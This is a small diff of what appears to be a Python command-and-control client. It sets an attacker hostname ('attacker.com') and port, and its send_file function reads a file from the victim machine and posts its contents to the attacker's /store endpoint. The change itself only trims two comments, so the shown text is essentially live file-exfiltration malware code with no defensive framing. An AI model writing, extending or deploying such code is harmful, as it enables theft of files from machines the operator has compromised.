@@ -5,7 +5,7 @@ import subprocess
 import time
 import os
 
-ATTACKER_HOSTNAME = 'attacker.com' # change this to the attacker's IP address
+ATTACKER_HOSTNAME = 'attacker.com' # change this to the attacker's address
 ATTACKER_PORT = 443
 proxy = "proxy.example.com:8080"
 
@@ -29,7 +29,7 @@ def send_file(command):
         send_post("[-] Not able to find the file")
         return
 
-    store_url = f'http://{ATTACKER_HOSTNAME}:{ATTACKER_PORT}/store' # Posts to /store
+    store_url = f'http://{ATTACKER_HOSTNAME}:{ATTACKER_PORT}/store'
     with open(path, 'rb') as fp:
         send_post(fp.read(), url=store_url)
 
